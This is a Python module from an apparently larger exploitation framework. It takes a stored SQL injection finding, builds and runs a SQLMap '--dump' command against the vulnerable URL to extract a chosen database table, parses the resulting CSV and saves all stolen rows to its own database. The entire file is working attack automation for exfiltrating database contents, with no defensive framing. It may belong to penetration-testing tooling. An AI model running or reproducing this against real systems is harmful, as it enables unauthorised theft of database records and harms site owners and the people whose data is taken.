#!/usr/bin/env python3
"""
db_dumper.py - Dump of a specific table from an already-exploited DB (SQLMap).

Pattern: BaseModule (Template Method) + SqlmapTool (rich Adapter).
All the SQLMap logic (base flags, form-data, execution+parsing, CSV) lives in
the tool; the module only builds the concrete target and persists.
"""

from __future__ import annotations

if __name__ == "__main__":
    import os
    import sys
    sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))

import json

from core import ModuleBase, ModuleResult
from tools import SqlmapTool


class DBDumper(ModuleBase):
    slug = "db_dumper"

    def __init__(self, sqli_id, db_name, table, *, job_id=None):
        super().__init__(target_id=sqli_id, job_id=job_id)
        self.db_name = db_name
        self.table = table
        self.sqlmap = SqlmapTool()
        self.vulnerability = None
        self.crawl_details = None

    def validate(self) -> bool:
        self.require_tool(self.sqlmap)
        return True

    def load(self) -> bool:
        if not self.target_id:
            self.console.error("No sqli_detector_id was specified")
            return False
        vulns = self.db.get_vulnerable_sqli() or []
        self.vulnerability = next((v for v in vulns if v["id"] == self.target_id), None)
        if not self.vulnerability:
            self.console.error(f"There is no vulnerability with ID {self.target_id}")
            return False
        self.crawl_details = self.db.get_crawl_page_details(self.vulnerability["crawl_page_id"])
        return True

    def run(self) -> ModuleResult:
        self.console.banner("📥 DBDUMPER - Table dump")
        self.console.plain(f"🆔 SQLi ID: {self.target_id}  📦 {self.db_name}  📄 {self.table}")
        self.console.plain(f"🌐 {self.vulnerability['target_url']} ({self.vulnerability['method']})")
        self.console.warn("This may take a while...")

        cmd = self.sqlmap.command_for_vuln(
            self.vulnerability["target_url"], self.vulnerability["method"],
            ["-D", self.db_name, "-T", self.table, "--dump"],
            forms_json=(self.crawl_details or {}).get("forms_json"))
        report = self.sqlmap.run_parsed(cmd, max_time=360)

        if not (report.dumped or report.entries):
            return ModuleResult.fail(self.slug, "Could not extract the table")

        csv_file = self.sqlmap.find_dump_csv(self.vulnerability["target_url"], self.db_name, self.table)
        if not csv_file:
            return ModuleResult.ok(self.slug, "Dump done (CSV not available)",
                                   findings=report.entries)

        headers, rows = self.sqlmap.read_csv_dump(csv_file)
        if not rows:
            return ModuleResult.ok(self.slug, "Dump done (empty CSV)", findings=report.entries)

        data = self.sqlmap.rows_as_dicts(headers, rows)
        self.db.insert_sqli_exploit_data(
            sqli_exploit_columns_id=None, db_name=self.db_name, table_name=self.table,
            data_json=json.dumps({"database": self.db_name, "table": self.table,
                                  "entries": len(data), "rows": data}, ensure_ascii=False),
            dump_success=1, jobs_id=self.job_id,
        )
        return ModuleResult.ok(self.slug, f"Table '{self.table}' dumped", findings=len(data),
                               columns=", ".join(headers))

    def report(self, result: ModuleResult) -> None:
        self.console.banner("✅ DUMP COMPLETED" if result.succeeded else "❌ DUMP FAILED")
        if result.succeeded:
            self.console.plain(f"📊 Rows: {result.findings}")
            if result.data.get("columns"):
                self.console.plain(f"📊 Columns: {result.data['columns']}")
        else:
            self.console.error(result.message)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Dumps a specific table from an already-exploited DB")
    parser.add_argument("--sqli-id", type=int, required=True, help="ID of an already-exploited sqli_detector")
    parser.add_argument("--db-name", required=True, help="Database name")
    parser.add_argument("--table", required=True, help="Name of the table to dump")
    parser.add_argument("--job-id", type=int, default=None, help="Job ID (for activity logs)")
    args = parser.parse_args()

    result = DBDumper(
        args.sqli_id, args.db_name, args.table, job_id=args.job_id,
    ).execute()
    sys.exit(result.exit_code())
